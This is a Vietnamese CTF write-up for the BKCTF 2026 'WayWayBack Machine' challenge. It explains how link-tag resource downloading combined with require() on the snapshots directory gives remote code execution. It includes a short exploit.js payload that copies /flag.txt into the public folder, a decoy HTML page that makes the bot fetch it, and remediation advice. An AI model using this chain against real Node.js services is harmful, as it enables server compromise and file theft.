# Write-up: WayWayBack Machine - BKCTF 2026

## 1. Phân tích bài toán
Dựa trên mã nguồn `server.js` được cung cấp, hệ thống có 2 chức năng chính:
1.  **Tạo Snapshot (`/api/snapshot`):** Người dùng gửi một URL, server dùng Puppeteer (bot) truy cập URL đó, lấy nội dung HTML, sanitize (làm sạch) rồi lưu vào thư mục `/app/snapshots`.
2.  **Xem Snapshot (`/snapshot/:id`):** Server trả về file HTML đã lưu. Tuy nhiên, trước khi trả về, nó gọi hàm `preloadSnapshotResources()`.

## 2. Tìm kiếm lỗ hổng
Lỗ hổng nằm ở sự kết hợp giữa việc **tự động tải tài nguyên** và **thực thi code không kiểm soát**.

### Lỗ hổng 1: Tải file tùy ý (Arbitrary File Download)
Trong hàm `archiveResources`, server trích xuất tất cả các thẻ `<link href="...">` từ trang web của người dùng và tải chúng về thư mục `/app/snapshots`:
```javascript
// Trích xuất link
const resourceUrls = extractResourceUrls(htmlContent, targetUrl);

for (const resourceUrl of resourceUrls) {
    // ... lấy tên file từ URL ...
    const savePath = path.join(SNAPSHOTS_DIR, filename);
    // Tải và lưu vào thư mục snapshots
    await downloadFile(resourceUrl, savePath); 
}
```
Mặc dù có hàm sanitize tên file, nhưng nó vẫn cho phép lưu file có đuôi `.js` nếu URL kết thúc bằng `.js`.

### Lỗ hổng 2: Remote Code Execution (RCE) qua `require()`
Đây là lỗ hổng nghiêm trọng nhất nằm trong hàm `preloadSnapshotResources`:
```javascript
async function preloadSnapshotResources() {
    const entries = fs.readdirSync(SNAPSHOTS_DIR, { withFileTypes: true });
    for (const entry of entries) {
        // ...
        if (path.extname(entry.name) === '.js') {
            try {
                require(filePath); // <--- VULNERABILITY: Thực thi file JS bất kỳ nào trong thư mục snapshots
            } catch (err) { }
        }
    }
}
```
Hàm này quét toàn bộ thư mục `/app/snapshots`, thấy file nào có đuôi `.js` là nó gọi `require()`. Trong Node.js, `require()` một file JS đồng nghĩa với việc **thực thi toàn bộ mã code** bên trong file đó.

## 3. Kịch bản tấn công (Exploit Strategy)
1.  **Chuẩn bị mã độc:** Viết một file `.js` thực hiện hành động chiếm quyền hoặc đọc cờ.
2.  **Vượt qua rào cản exfiltration:** Vì bạn không muốn dùng ngrok/webhook để gửi cờ ra ngoài, chúng ta sẽ tận dụng thư mục `public` của Express (thư mục này cho phép truy cập file tĩnh công khai). Ta sẽ ra lệnh cho server copy file `/flag.txt` vào `/app/public/flag.txt`.
3.  **Đưa mã độc lên server:** Tạo một trang HTML "mồi" có thẻ `<link>` trỏ đến file `.js` mã độc.
4.  **Kích hoạt:** Gửi URL trang mồi cho bot. Sau khi bot tải xong, truy cập vào bất kỳ snapshot nào để kích hoạt hàm `require()`.

## 4. Các bước thực hiện chi tiết

### Bước 1: Tạo payload mã độc
Tạo một Gist trên Github với tên file là `exploit.js`:
```javascript
const fs = require('fs');
// Copy flag vào thư mục public để có thể đọc qua trình duyệt
try {
    fs.copyFileSync('/flag.txt', '/app/public/flag.txt');
} catch (e) {}
```
Lấy link **Raw** của Gist này (ví dụ: `https://gist.githubusercontent.com/.../exploit.js`).

### Bước 2: Tạo trang mồi (Decoy Page)
Dùng Webhook.site hoặc bất kỳ dịch vụ host web nào (như Github Pages) để trả về nội dung HTML sau (phải cấu hình `Content-Type: text/html`):
```html
<!DOCTYPE html>
<html>
<head>
    <!-- Thẻ link này sẽ lừa bot tải file exploit.js về thư mục snapshots -->
    <link rel="stylesheet" href="https://gist.githubusercontent.com/.../exploit.js">
</head>
<body>Triggering exploit...</body>
</html>
```

### Bước 3: Thực thi
1.  Nhập URL trang mồi vào Web WayWayBack Machine.
2.  Hệ thống báo: *“Snapshot queued!”*. Bot sẽ truy cập trang mồi -> thấy thẻ link -> tải `exploit.js` và lưu vào `/app/snapshots/exploit.js`.
3.  Sau khi bot chạy xong (đợi khoảng 5-10 giây), bạn truy cập vào link snapshot mà hệ thống vừa tạo ra (ví dụ: `http://[IP]:3000/snapshot/[ID]`).
4.  Lúc này, server chạy hàm `preloadSnapshotResources()`, tìm thấy `exploit.js` và `require()` nó. Lệnh copy file cờ được thực thi.

### Bước 4: Nhận kết quả
Truy cập vào đường dẫn trực tiếp trên server:
`http://[ĐỊA-CHỈ-IP-BÀI-CTF]:3000/flag.txt`

**Flag:** `bkctf{m4yb3_1_sh0u1d_st1ck_w1th_4rch1v3_10}`

---

## 5. Cách khắc phục (Remediation)
1.  **Không bao giờ dùng `require()` với dữ liệu do người dùng tải lên:** Đây là quy tắc tối kỵ trong bảo mật Node.js.
2.  **Cô lập thư mục:** Tài nguyên tải về (ảnh, css, js tĩnh) nên được lưu ở một thư mục riêng biệt, không nằm chung với logic xử lý của ứng dụng.
3.  **Dùng Sandbox:** Nếu bắt buộc phải thực thi code lạ, hãy dùng các thư viện sandbox như `vm2` (tuy nhiên hiện nay vm2 cũng đã ngừng phát triển vì nhiều lỗ hổng bypass) hoặc chạy trong một container riêng biệt.
4.  **Kiểm soát loại file:** Chỉ cho phép tải các loại file an toàn (jpg, png, css) và kiểm tra nội dung file thay vì chỉ kiểm tra đuôi file.